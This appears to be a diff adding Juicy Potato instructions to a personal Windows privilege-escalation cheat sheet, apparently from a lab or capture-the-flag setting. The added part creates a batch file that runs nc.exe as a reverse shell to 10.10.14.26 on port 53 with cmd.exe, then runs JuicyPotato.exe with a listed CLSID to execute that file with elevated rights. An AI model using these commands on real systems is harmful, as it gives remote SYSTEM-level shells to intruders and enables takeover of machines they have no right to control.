@@ -8,3 +8,21 @@ The -ip should be the victims IP. Not yours.
 
 Tater.ps1 Instructions
 
+
+
+
+____
+
+Juicy Potato Instructions
+
+---- go.bat ----
+C:\Users\Administrator\.jenkins\nc.exe 10.10.14.26 53 -e C:\Windows\System32\cmd.exe --- make a bat file.
+---- go.bat ----
+
+C:\Windows\>JuicyPotato.exe -l 1337 -p C:\Users\Administrator\.jenkins\go.bat -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
+
+
+CLISD: https://ohpe.it/juicy-potato/CLSID/
+
+
+
